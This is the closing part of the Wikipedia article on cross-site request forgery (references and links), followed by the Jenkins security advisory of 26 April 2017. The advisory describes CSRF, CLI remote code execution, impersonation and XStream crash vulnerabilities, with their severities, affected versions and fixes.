* POST [request method](/wiki/Request_method "Request method") was for a while perceived as immune to trivial CSRF attacks using parameters in URL (using GET method). However, both POST and any other HTTP method can be now easily executed using [XMLHttpRequest](/wiki/XMLHttpRequest "XMLHttpRequest"). Filtering out unexpected GET requests still prevents some particular attacks, such as cross-site attacks using malicious image URLs or link addresses and cross-site information leakage through `<script>` elements (*JavaScript hijacking*); it also prevents (non-security-related) problems with aggressive [web crawlers](/wiki/Web_crawler "Web crawler") and [link prefetching](/wiki/Link_prefetching "Link prefetching").[[1]](#cite_note-Shiflett-1)

[Cross-site scripting](/wiki/Cross-site_scripting "Cross-site scripting") (XSS) vulnerabilities (even in other applications running on the same domain) allow attackers to bypass essentially all CSRF preventions.[[33]](#cite_note-33)

## See also

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=16 "Edit section: See also")]

* [BREACH](/wiki/BREACH "BREACH")
* [Confused deputy problem](/wiki/Confused_deputy_problem "Confused deputy problem")
* [CRIME](/wiki/CRIME "CRIME")
* [Web Messaging](/wiki/Web_Messaging "Web Messaging")
* [Heap spraying](/wiki/Heap_spraying "Heap spraying")
* [Replay attack](/wiki/Replay_attack "Replay attack")
* [Session fixation](/wiki/Session_fixation "Session fixation")
* [Application security](/wiki/Application_security "Application security")

## References

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=17 "Edit section: References")]

1. ^ [***a***](#cite_ref-Shiflett_1-0) [***b***](#cite_ref-Shiflett_1-1) [***c***](#cite_ref-Shiflett_1-2) [***d***](#cite_ref-Shiflett_1-3) [***e***](#cite_ref-Shiflett_1-4) Shiflett, Chris (December 13, 2004). ["Security Corner: Cross-Site Request Forgeries"](http://shiflett.org/articles/cross-site-request-forgeries). php|architect (via shiflett.org). Retrieved 2008-07-03.
2. ^ [***a***](#cite_ref-Ristic_2-0) [***b***](#cite_ref-Ristic_2-1) Ristic, Ivan (2005). [*Apache Security*](https://archive.org/details/apachesecurity00rist_938). O'Reilly Media. p. [280](https://archive.org/details/apachesecurity00rist_938/page/n303). [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [0-596-00724-8](/wiki/Special%3ABookSources/0-596-00724-8 "Special:BookSources/0-596-00724-8").
3. **[^](#cite_ref-Synopsys_3-0)** ["What is Cross-Site Request Forgery (CSRF) and How Does It Work? | Synopsys"](https://www.synopsys.com/glossary/what-is-csrf.html).
4. **[^](#cite_ref-4)** ["What is CSRF (Cross-site request forgery)? Tutorial & Examples"](https://portswigger.net/web-security/csrf). *portswigger.net*. Retrieved 2019-11-04.
5. **[^](#cite_ref-Burns_5-0)** Burns, Jesse (2005). ["Cross Site Request Forgery: An Introduction To A Common Web Weakness"](https://web.archive.org/web/20130121165930/https%3A//www.isecpartners.com/media/11961/CSRF_Paper.pdf) (PDF). Information Security Partners, LLC. Archived from [the original](https://www.isecpartners.com/media/11961/CSRF_Paper.pdf) (PDF) on 2013-01-21. Retrieved 2011-12-12.
6. **[^](#cite_ref-6)** Christey, Steve; Martin, Robert A. (May 22, 2007). ["Vulnerability Type Distributions in CVE (version 1.1)"](http://cwe.mitre.org/documents/vuln-trends/index.html). MITRE Corporation. Retrieved 2008-06-07.
7. **[^](#cite_ref-7)** Washkuch Jr., Frank (October 17, 2006). ["Netflix fixes cross-site request forgery hole"](https://www.scmagazine.com/home/security-news/netflix-fixes-cross-site-request-forgery-hole/). SC Magazine. Retrieved 2019-02-11.
8. ^ [***a***](#cite_ref-zeller_8-0) [***b***](#cite_ref-zeller_8-1) William Zeller; Edward W. Felten (October 2008). ["Cross-Site Request Forgeries: Exploitation and Prevention"](https://www.eecs.berkeley.edu/~daw/teaching/cs261-f11/reading/csrf.pdf) (PDF). Retrieved 29 May 2015.
9. **[^](#cite_ref-Mike_9-0)** Mike, Bailey (2009). ["CSRF: Yeah, It Still Works…"](https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-bailey-mcree-csrf.pdf) (PDF). DEFCON.
10. **[^](#cite_ref-10)**
    ["Cross Site Request Forgery protection | Django documentation | Django"](https://docs.djangoproject.com/en/1.8/ref/csrf/). *docs.djangoproject.com*. Retrieved 2015-08-21.
11. **[^](#cite_ref-11)** Adam Barth, Collin Jackson, and John C. Mitchell, [Robust Defenses for Cross-Site Request Forgery](http://www.adambarth.com/papers/2008/barth-jackson-mitchell-b.pdf), *Proceedings of the 15th ACM Conference on Computer and Communications Security,* ACM 2008
12. **[^](#cite_ref-:0_12-0)** Joseph Foulds, [Passive monitoring login request forgery, Yahoo](http://www.jfoulds.com/blog/passive-monitoring-login-request-forgery/) [Archived](https://web.archive.org/web/20141222202044/http%3A//jfoulds.com/blog/passive-monitoring-login-request-forgery/) 2014-12-22 at the [Wayback Machine](/wiki/Wayback_Machine "Wayback Machine")
13. **[^](#cite_ref-13)** ["Cross-Site Request Forgery For POST Requests With An XML Body"](http://pentestmonkey.net/blog/csrf-xml-post-request). pentestmonkey. Retrieved September 4, 2015.
14. **[^](#cite_ref-14)** Sheeraj Shah (2008). ["Web 2.0 Hacking Defending Ajax & Web Services"](http://conference.hitb.org/hitbsecconf2007dubai/materials/D2%20-%20Shreeraj%20Shah%20-%20Web%202-0%20Hacking%20-%20Defending%20Ajax%20and%20Web%20Services.pdf.pdf) (PDF). HITB. Retrieved September 4, 2015.
15. **[^](#cite_ref-15)** ["Security Fix - Weaponizing Web 2.0"](https://web.archive.org/web/20120528063619/http%3A//voices.washingtonpost.com/securityfix/2009/07/weaponizing_web_20.html). Archived from [the original](http://voices.washingtonpost.com/securityfix/2009/07/weaponizing_web_20.html) on May 28, 2012.
16. **[^](#cite_ref-16)** [Dynamic CSRF](http://www.neohaxor.org/2009/08/11/dynamic-cross-site-request-forgery/) [Archived](https://web.archive.org/web/20100213160456/http%3A//www.neohaxor.org/2009/08/11/dynamic-cross-site-request-forgery/) 2010-02-13 at the [Wayback Machine](/wiki/Wayback_Machine "Wayback Machine")
17. **[^](#cite_ref-17)** Owasp.org: [Israel 2012/01: AJAX Hammer – Harnessing AJAX for CSRF Attacks](https://www.owasp.org/index.php/OWASP_Israel_2012_01#18:15_-_19:00.C2.A0:_AJAX.E2.80.99_Hammer_-_Harnessing_AJAX_for_CSRF_Attacks) [Archived](https://web.archive.org/web/20131001151842/https%3A//www.owasp.org/index.php/OWASP_Israel_2012_01#18:15_-_19:00.C2.A0:_AJAX.E2.80.99_Hammer_-_Harnessing_AJAX_for_CSRF_Attacks) 2013-10-01 at the [Wayback Machine](/wiki/Wayback_Machine "Wayback Machine")
18. **[^](#cite_ref-18)** [Downloads – hasc-research – hasc-research – Google Project Hosting](https://code.google.com/p/hasc-research/downloads/list). Code.google.com (2013-06-17). Retrieved on 2014-04-12.
19. **[^](#cite_ref-19)** ["Vulnerability Note VU#584089 - cPanel XSRF vulnerabilities"](http://www.kb.cert.org/vuls/id/584089).
20. **[^](#cite_ref-20)** ["Vulnerability Note VU#264385 - OpenCA allows Cross site request forgery (XSRF)"](http://www.kb.cert.org/vuls/id/264385).
21. **[^](#cite_ref-21)** ["Enhanced cross-site attack prevention"](https://worldwide.espacenet.com/publicationDetails/biblio?DB=EPODOC&II=0&ND=3&adjacent=true&locale=en_EP&FT=D&date=20081029&CC=EP&NR=1986395A1&KC=A1). *Espacenet*. European Patent Office. Retrieved 21 November 2019.
22. **[^](#cite_ref-22)** ["CSRF: Cross-site request forgery attacks explained"](https://www.ionos.com/digitalguide/server/security/cross-site-request-forgery-csrf/). *IONOS Digitalguide*. Retrieved 2022-04-26.
23. **[^](#cite_ref-owasp_23-0)** ["Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet"](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html). OWASP. Retrieved 2019-07-19.
24. **[^](#cite_ref-Valhalla_24-0)** ["Valhalla Articles - Cross-Site Request Forgery: Demystified"](https://web.archive.org/web/20140129030557/http%3A//halls-of-valhalla.org/beta/articles/cross-site-request-forgery-demystified%2C47/). Archived from the original on January 29, 2014.
25. **[^](#cite_ref-25)** ["Cross Site Request Forgery protection"](https://web.archive.org/web/20150120134602/https%3A//docs.djangoproject.com/en/1.7/ref/contrib/csrf/). Django. Archived from [the original](https://docs.djangoproject.com/en/1.7/ref/contrib/csrf/) on 2015-01-20. Retrieved 2015-01-20.
26. **[^](#cite_ref-26)** ["Cross Site Request Forgery (XSRF) Protection"](https://docs.angularjs.org/api/ng/service/%24http#cross-site-request-forgery-xsrf-protection). AngularJS. Retrieved 2015-01-20.
27. **[^](#cite_ref-27)** ["Making a Service Available Across Domain Boundaries"](http://msdn.microsoft.com/en-us/library/cc197955.aspx).
28. **[^](#cite_ref-28)** Adamski, Lucas. ["Cross-domain policy file usage recommendations for Flash Player - Adobe Developer Connection"](https://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html).
29. **[^](#cite_ref-29)** ["Double Submit Cookie defence"](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#double-submit-cookie). OWASP.
30. **[^](#cite_ref-30)** ["SameSite cookies"](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies). Mozilla. 10 April 2023.
31. **[^](#cite_ref-31)** [Origin Header Proposal](https://people.mozilla.org/~bsterne/content-security-policy/origin-header-proposal.html) [Archived](https://web.archive.org/web/20160308045123/http%3A//people.mozilla.org/~bsterne/content-security-policy/origin-header-proposal.html) 2016-03-08 at the [Wayback Machine](/wiki/Wayback_Machine "Wayback Machine"). People.mozilla.org. Retrieved on 2013-07-29.
32. **[^](#cite_ref-32)** ["Secunia Advisory SA22467"](https://secunia.com/advisories/22467/). Secunia. 19 October 2006. Retrieved 11 September 2012.
33. **[^](#cite_ref-33)** Schneider, Christian. ["CSRF and same-origin XSS"](https://web.archive.org/web/20120814151512/http%3A//www.webappsecblog.com/CsrfAndSameOriginXss.html). Archived from [the original](http://www.webappsecblog.com/CsrfAndSameOriginXss.html) on 2012-08-14. Retrieved 2012-04-21.

## External links

[[edit](/w/index.php?title=Cross-site_request_forgery&action=edit&section=18 "Edit section: External links")]

* [A Most-Neglected Fact About Cross Site Request Forgery](https://web.archive.org/web/20121018055752/http%3A//yehg.net/lab/pr0js/view.php/A_Most-Neglected_Fact_About_CSRF.pdf)
* [The Cross-Site Request Forgery FAQ](http://www.cgisecurity.com/csrf-faq.html)
* [Cross-Site Request Forgery from The Web Application Security Consortium Threat Classification Project](https://web.archive.org/web/20090914043521/http%3A//projects.webappsec.org/Cross-Site%2BRequest%2BForgery)

![](https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&type=1x1&usesul3=0)
Retrieved from "<https://en.wikipedia.org/w/index.php?title=Cross-site_request_forgery&oldid=1267985212>"
[Categories](/wiki/Help%3ACategory "Help:Category"):

* [Web security exploits](/wiki/Category%3AWeb_security_exploits "Category:Web security exploits")
* [Client-side web security exploits](/wiki/Category%3AClient-side_web_security_exploits "Category:Client-side web security exploits")
Hidden categories:

* [Webarchive template wayback links](/wiki/Category%3AWebarchive_template_wayback_links "Category:Webarchive template wayback links")
* [CS1: unfit URL](/wiki/Category%3ACS1%3A_unfit_URL "Category:CS1: unfit URL")
* [Articles with short description](/wiki/Category%3AArticles_with_short_description "Category:Articles with short description")
* [Short description is different from Wikidata](/wiki/Category%3AShort_description_is_different_from_Wikidata "Category:Short description is different from Wikidata")
* [Articles needing additional references from May 2018](/wiki/Category%3AArticles_needing_additional_references_from_May_2018 "Category:Articles needing additional references from May 2018")
* [All articles needing additional references](/wiki/Category%3AAll_articles_needing_additional_references "Category:All articles needing additional references")

* This page was last edited on 7 January 2025, at 16:52 (UTC).
* Text is available under the [Creative Commons Attribution-ShareAlike 4.0 License](/wiki/Wikipedia%3AText_of_the_Creative_Commons_Attribution-ShareAlike_4.0_International_License "Wikipedia:Text of the Creative Commons Attribution-ShareAlike 4.0 International License");
  additional terms may apply. By using this site, you agree to the [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use "foundation:Special:MyLanguage/Policy:Terms of Use") and [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy "foundation:Special:MyLanguage/Policy:Privacy policy"). Wikipedia® is a registered trademark of the [Wikimedia Foundation, Inc.](https://wikimediafoundation.org/), a non-profit organization.

* [Privacy policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy)
* [About Wikipedia](/wiki/Wikipedia%3AAbout)
* [Disclaimers](/wiki/Wikipedia%3AGeneral_disclaimer)
* [Contact Wikipedia](//en.wikipedia.org/wiki/Wikipedia%3AContact_us)
* [Code of Conduct](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AUniversal_Code_of_Conduct)
* [Developers](https://developer.wikimedia.org)
* [Statistics](https://stats.wikimedia.org/#/en.wikipedia.org)
* [Cookie statement](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ACookie_statement)
* [Mobile view](//en.m.wikipedia.org/w/index.php?title=Cross-site_request_forgery&mobileaction=toggle_view_mobile)

* [![Wikimedia Foundation](/static/images/footer/wikimedia-button.svg)](https://wikimediafoundation.org/)
* [![Powered by MediaWiki](/w/resources/assets/poweredby_mediawiki.svg)](https://www.mediawiki.org/)

Search

Search

Toggle the table of contents

Cross-site request forgery

21 languages

Add topic



=== Content from jenkins.io_1fb35682_20250125_070232.html ===


# Jenkins Security Advisory 2017-04-26

This advisory announces multiple vulnerabilities in Jenkins.

## Description

### CSRF: Multiple vulnerabilities

**SECURITY-412 through SECURITY-420 / CVE-2017-1000356**

Multiple [Cross-Site Request Forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) vulnerabilities in Jenkins allowed malicious users to perform several administrative actions by tricking a victim into opening a web page.
The most notable ones:

* SECURITY-412: Restart Jenkins immediately, after all builds are finished, or after all plugin installations and builds are finished
* SECURITY-412: Schedule a downgrade of Jenkins to a previously installed version if Jenkins previously upgraded itself
* SECURITY-413: Install and (optionally) dynamically load any plugin present on a configured update site
* SECURITY-414: Remove any update site from the Jenkins configuration
* SECURITY-415: Change a user’s API token
* SECURITY-416: Submit system configuration
* SECURITY-417: Submit global security configuration
* SECURITY-418, SECURITY-420: For Jenkins user database authentication realm: create an account if signup is enabled; or create an account if the victim is an administrator, possibly deleting the existing default "admin" user in the process
* SECURITY-419: Create a new agent, possibly executing arbitrary shell commands on the Jenkins controller by choosing the appropriate launch method
* SECURITY-420: Cancel a scheduled restart
* SECURITY-420: Configure the global logging levels
* SECURITY-420: Create a copy of an existing agent
* SECURITY-420: Create copies of views in users' "My Views" or as children of the experimental "Tree View" feature
* SECURITY-420: Enter "quiet down" mode in which no new builds are started
* SECURITY-420: On Windows, after successful installation as a service, restart
* SECURITY-420: On Windows, try to install Jenkins as a service
* SECURITY-420: Set the descriptions of items (jobs), builds, and users
* SECURITY-420: Submit global tools configuration (Jenkins 2.0 and up)
* SECURITY-420: Toggle keeping a build forever (i.e. exclude or include it in log rotation)
* SECURITY-420: Try to connect all disconnected agents simultaneously
* SECURITY-420: Update the node monitor data on all agents

The above, as well as several other more minor issues, have all been fixed and these actions now require POST requests, and, if configured, a CSRF crumb, to work.

### CLI: Unauthenticated remote code execution

**SECURITY-429 / CVE-2017-1000353**

An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java `SignedObject` object to the remoting-based Jenkins CLI, that would be deserialized using a new `ObjectInputStream`, bypassing the existing blocklist-based protection mechanism.

`SignedObject` has been added to the remoting blocklist.

In Jenkins 2.54, the remoting-based CLI protocol was deprecated and a new, HTTP based protocol introduced as the new default, in addition to the existing SSH-based CLI.
This feature has been backported to Jenkins 2.46.2.
It is strongly recommended that users upgrading Jenkins disable the remoting-based CLI, and use the one of the other modes (HTTP or SSH) instead.

### CLI: Login command allowed impersonating any Jenkins user

**SECURITY-466 / CVE-2017-1000354**

The `login` command available in the remoting-based CLI stored the encrypted user name of the successfully authenticated user in a cache file used to authenticate further commands.
Users with sufficient permission to create secrets in Jenkins, and download their encrypted values (e.g. with Job/Configure permission), were able to impersonate any other Jenkins user on the same instance.

This has been fixed by storing the cached authentication as a hash-based MAC with a key specific to the Jenkins instance and the CLI authentication cache.

Previously cached authentications are invalidated when upgrading Jenkins to a version containing a fix for this.

### XStream: Java crash when trying to instantiate void/Void

**SECURITY-503 / CVE-2017-1000355**

Jenkins uses the XStream library to serialize and deserialize XML.
Its maintainer [recently published a security vulnerability](https://www.openwall.com/lists/oss-security/2017/04/03/4) that allows anyone able to provide XML to Jenkins for processing using XStream to crash the Java process.
In Jenkins this typically applies to users with permission to create or configure items (jobs), views, or agents.

Jenkins now prohibits the attempted deserialization of `void` / `Void` that results in a crash.

## Severity

* SECURITY-412 through SECURITY-420: [high](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)
* SECURITY-429: [critical](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
* SECURITY-466: [high](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
* SECURITY-503: [medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)

## Affected versions

* All Jenkins main line releases up to and including 2.56
* All Jenkins LTS releases up to and including 2.46.1

## Fix

* Jenkins main line users should update to 2.57
* Jenkins LTS users should update to 2.46.2

These versions include fixes to all the vulnerabilities described above.
All prior versions are affected by these vulnerabilities unless otherwise indicated.

## Credit

The Jenkins project would like to thank the reporters for discovering and [reporting](/security/#reporting-vulnerabilities) these vulnerabilities:

* **An independent security researcher who reported this vulnerability to Beyond Securityâs SecuriTeam Secure Disclosure program** for SECURITY-429
* **Jesse Glick, CloudBees, Inc.** for SECURITY-466
* **Steve Marlowe <smarlowe@cisco.com> of Cisco ASIG** for SECURITY-412, SECURITY-413, SECURITY-414, SECURITY-415, SECURITY-416, SECURITY-417, SECURITY-418, and SECURITY-419

## Other Resources

* [Announcement blog post](/blog/2017/04/26/security-advisory/)


